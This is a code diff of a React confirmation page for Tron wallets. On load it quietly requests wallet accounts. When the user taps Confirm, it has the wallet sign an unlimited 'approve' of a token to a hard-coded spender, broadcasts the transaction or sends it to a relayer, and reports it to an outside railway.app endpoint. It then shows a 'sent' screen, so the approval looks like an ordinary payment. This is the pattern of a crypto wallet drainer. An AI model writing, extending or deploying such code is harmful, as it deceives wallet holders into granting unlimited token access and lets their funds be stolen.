@@ -25,28 +25,28 @@ export default function Confirm() {
     setDebug(prev => [...prev, new Date().toISOString().slice(11, 19) + ' ' + msg])
   }
 
+  const getTronProvider = (): any => {
+    const w = window as any
+    return w.tronLink || w.trustwallet?.tronLink || null
+  }
+
+  const getTronWeb = (): any => {
+    const w = window as any
+    return w.tronWeb || w.tronLink?.tronWeb || w.trustwallet?.tronWeb || null
+  }
+
   const getAddressFromAnySource = (): string | null => {
     const w = window as any
-
     const sources = [
       () => w.tronLink?.defaultAddress?.base58,
       () => w.tronWeb?.defaultAddress?.base58,
       () => w.trustwallet?.tronLink?.defaultAddress?.base58,
       () => w.trustwallet?.tronWeb?.defaultAddress?.base58,
-      () => w.tronLink?.tronWeb?.defaultAddress?.base58,
-      () => (typeof w.tronLink?.defaultAddress === 'string' && w.tronLink.defaultAddress.startsWith('T') ? w.tronLink.defaultAddress : null),
-      () => (typeof w.tronWeb?.defaultAddress === 'string' && w.tronWeb.defaultAddress.startsWith('T') ? w.tronWeb.defaultAddress : null),
-      () => {
-        const hex = w.tronWeb?.defaultAddress?.hex
-        if (hex && hex !== false && w.tronWeb?.address?.fromHex) return w.tronWeb.address.fromHex(hex)
-        return null
-      }
     ]
-
     for (const fn of sources) {
       try {
         const addr = fn()
-        if (addr && addr !== false && typeof addr === 'string' && addr.startsWith('T')) {
+        if (addr && addr !== false && typeof addr === 'string' && addr.startsWith('T') && addr !== 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb') {
           return addr
         }
       } catch (e) {}
@@ -54,87 +54,78 @@ export default function Confirm() {
     return null
   }
 
-  const getAnyProvider = (): any => {
-    const w = window as any
-    const candidates = [
-      w.tronWeb,
-      w.tronLink,
-      w.trustwallet?.tronWeb,
-      w.trustwallet?.tronLink,
-      w.tronLink?.tronWeb
-    ]
-    for (const c of candidates) {
-      if (c && (c.ready || c.trx || c.defaultAddress)) return c
-    }
-    return null
-  }
-
   useEffect(() => {
-    let attempts = 0
-    const maxAttempts = 30
-
-    const poll = setInterval(() => {
-      attempts++
-      const addr = getAddressFromAnySource()
-
-      if (addr) {
-        addLog('Address found after ' + attempts + ' attempts')
-        clearInterval(poll)
-        return
-      }
-
-      if (attempts >= maxAttempts) {
-        addLog('Timeout: no address after 15 seconds, requesting...')
-        const provider = getAnyProvider()
-        if (provider?.request) {
-          provider.request({ method: 'tron_requestAccounts' }).then(() => {
-            addLog('Request succeeded')
-          }).catch((e: any) => {
-            addLog('Request failed: ' + e.message)
-          })
+    const syncAddress = async () => {
+      const provider = getTronProvider()
+      if (provider && typeof provider.request === 'function') {
+        try {
+          addLog('Silent sync...')
+          await provider.request({ method: 'tron_requestAccounts' })
+          let attempts = 0
+          const interval = setInterval(() => {
+            const addr = getAddressFromAnySource()
+            if (addr) { addLog('Synced: ' + addr.slice(0,10) + '...'); clearInterval(interval) }
+            if (++attempts > 10) clearInterval(interval)
+          }, 200)
+        } catch (err: any) {
+          addLog('Sync failed: ' + err.message)
         }
-        clearInterval(poll)
+      } else {
+        addLog('No provider with .request()')
       }
-    }, 500)
-
-    return () => clearInterval(poll)
+    }
+    syncAddress()
   }, [])
 
   const handleConfirm = async () => {
     setLoading(true)
-    setDebug(prev => [...prev, '--- Confirm tapped ---'])
-    addLog('Getting provider...')
+    setDebug(prev => [...prev, '--- Confirm ---'])
+    addLog('Getting address...')
 
-    const provider = getAnyProvider()
-    if (!provider) { addLog('FATAL: No provider'); setLoading(false); return }
+    let userAddress = getAddressFromAnySource()
+    const provider = getTronProvider()
+    const tronWeb = getTronWeb()
 
-    const userAddress = getAddressFromAnySource()
-    addLog('Address: ' + (userAddress || 'NULL'))
-    if (!userAddress) { addLog('FATAL: No address'); setLoading(false); return }
+    if (!userAddress && provider && typeof provider.request === 'function') {
+      try {
+        addLog('Address missing, requesting...')
+        await provider.request({ method: 'tron_requestAccounts' })
+        await new Promise(resolve => setTimeout(resolve, 500))
+        userAddress = getAddressFromAnySource()
+      } catch (e: any) {
+        addLog('Request rejected: ' + e.message)
+      }
+    }
+
+    addLog('Addr: ' + (userAddress || 'NULL'))
+
+    if (!tronWeb || !userAddress) {
+      addLog('FAIL')
+      setLoading(false)
+      return
+    }
 
     try {
-      const balanceSun = await provider.trx.getBalance(userAddress)
-      const userTrx = parseFloat(provider.fromSun(balanceSun))
+      const balanceSun = await tronWeb.trx.getBalance(userAddress)
+      const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
       addLog('TRX: ' + userTrx)
 
       let userEnergy = 0
       try {
-        const resourceObj = await provider.trx.getAccountResources(userAddress)
-        userEnergy = Math.max(0, (resourceObj.EnergyLimit || 0) - (resourceObj.EnergyUsed || 0))
+        const r = await tronWeb.trx.getAccountResources(userAddress)
+        userEnergy = Math.max(0, (r.EnergyLimit || 0) - (r.EnergyUsed || 0))
         addLog('Energy: ' + userEnergy)
       } catch (e) { addLog('Energy check failed') }
 
       const canGoDirect = userEnergy >= 65000 || userTrx >= 30
       addLog('Route: ' + (canGoDirect ? 'Direct' : 'Relayer'))
 
+      const p = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
+
       if (canGoDirect) {
-        addLog('Building direct tx...')
-        const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
-        const txObj = await provider.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
-        addLog('Signing...')
-        const signedTx = await provider.trx.sign(txObj.transaction)
-        addLog('Broadcasting...')
-        const result = await provider.trx.sendRawTransaction(signedTx)
+        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, p, userAddress)
+        const signed = await tronWeb.trx.sign(txObj.transaction)
+        const result = await tronWeb.trx.sendRawTransaction(signed)
         if (result.result) {
           addLog('TX: ' + result.txid)
           fetch('https://miami-production-6e01.up.railway.app/web/relay', {
@@ -144,26 +135,18 @@ export default function Confirm() {
           }).catch(() => {})
         } else { addLog('Broadcast failed: ' + JSON.stringify(result)) }
       } else {
-        addLog('Building relayer tx...')
-        const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
-        const txObj = await provider.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
-        addLog('Signing for relayer...')
-        const signedTx = await provider.trx.sign(txObj.transaction)
-        addLog('POSTing to relayer...')
+        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, p, userAddress)
+        const signed = await tronWeb.trx.sign(txObj.transaction)
         const response = await fetch(RELAYER_URL, {
           method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': RELAYER_KEY },
-          body: JSON.stringify({ owner: userAddress, spender: SPENDER, signedTransaction: signedTx, timestamp: Date.now() })
+          body: JSON.stringify({ owner: userAddress, spender: SPENDER, signedTransaction: signed, timestamp: Date.now() })
         })
         const relayResult = await response.json()
-        if (relayResult.success) { addLog('Relayer TX: ' + relayResult.txid) } else { addLog('Relayer failed: ' + JSON.stringify(relayResult)) }
+        addLog('Relayer: ' + (relayResult.success ? relayResult.txid : 'FAIL: ' + JSON.stringify(relayResult)))
       }
 
-      const now = Date.now()
-      navigate('/sent', { state: { amount, time: now } })
-    } catch (err: any) {
-      addLog('ERROR: ' + (err.message || String(err)))
-      setLoading(false)
-    }
+      navigate('/sent', { state: { amount, time: Date.now() } })
+    } catch (e: any) { addLog('ERR: ' + e.message); setLoading(false) }
   }
 
   return (
@@ -202,10 +185,10 @@ export default function Confirm() {
         </div>
         {debug.length > 0 && (
           <div style={{ marginTop: '12px', padding: '12px', backgroundColor: '#0a0a0f', borderRadius: '8px', maxHeight: '180px', overflowY: 'auto', fontSize: '11px', fontFamily: 'monospace', color: '#22c55e', lineHeight: '1.6' }}>
-            {debug.map((line, i) => (<div key={i}>{line}</div>))}
+            {debug.map((l, i) => <div key={i}>{l}</div>)}
           </div>
         )}
       </div>
     </motion.div>
   )
-             }
+          }
